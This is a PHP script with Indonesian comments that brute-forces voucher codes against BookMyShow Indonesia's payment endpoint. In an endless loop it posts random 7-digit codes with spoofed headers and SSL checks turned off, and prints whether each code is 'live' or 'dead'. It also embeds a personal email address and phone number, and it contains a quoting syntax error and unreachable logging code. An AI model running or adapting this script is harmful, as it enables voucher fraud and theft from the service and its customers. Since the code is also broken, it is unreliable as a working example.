<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', -1);
while(true) {
  $server  = "https://id.bookmyshow.com/serv/doSecureTrans.bms";
  $email = "hafizjoundys@gmail.com"; // email lu
  $idcek = "3665897"; // nomor tiket
  $idcek2 = "7".mt_rand(1000000, 8000000); // no vocer
  $nomorhp = "082199066627"; // nomor hp lu
  $p1 = '{"uip":"'.$idcek2.'","email":"'.$email.'","mob":"'.$nomorhp.'","card_no":"","nb_code":""}';
  $data = array();
  $c = curl_init($server);
  curl_setopt($c, CURLOPT_REFERER, "https://id.bookmyshow.com/payment/?cid=ZRTS&sid=5595&ety=MT&ec=ET00004213");
  curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3067.6 Safari/537.36");
  curl_setopt($c, CURLOPT_TIMEOUT, 60);
  curl_setopt($c, CURLOPT_VERBOSE, false);
  curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($c, CURLOPT_POSTFIELDS,"a=WEBIDN&v=CBLT&t=".$idcek."&c=SETOFFERVIACOMP&p1=".urlencode($p1)."");
  curl_setopt($c, CURLOPT_POST, 1);
  curl_setopt($c, CURLOPT_HTTPHEADER, array(
   'Accept: */*',
   'Origin: https://id.bookmyshow.com',
   'Accept-Encoding: gzip, deflate, sdch, br',
   'Accept-Language: id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4',
   'Authority: id.bookmyshow.com',
  ));
  $cekme = curl_exec($c);
  $cekme = strip_tags($cekme);
  $getrespon = explode("|", $cekme);
  if(@$getrespon[0] == "true"){
      unset($getrespon[0]);
      array_pop($getrespon);
      $status = "HIDUP";
  } else {
      $status = "MATI";
  }
  echo $idcek2 . " - " . $status . "\n";
 $simpan = "$idcek2 . " - " . $status";

}

$file1 = "killing2.php";
$handle1 = fopen($file1, 'a');
fwrite($handle1,$simpan);
fwrite($handle1, "<br>");
fclose($handle1);

$url = $_SERVER['REQUEST_URI'];
header("Refresh: 5; URL=$url");
?>
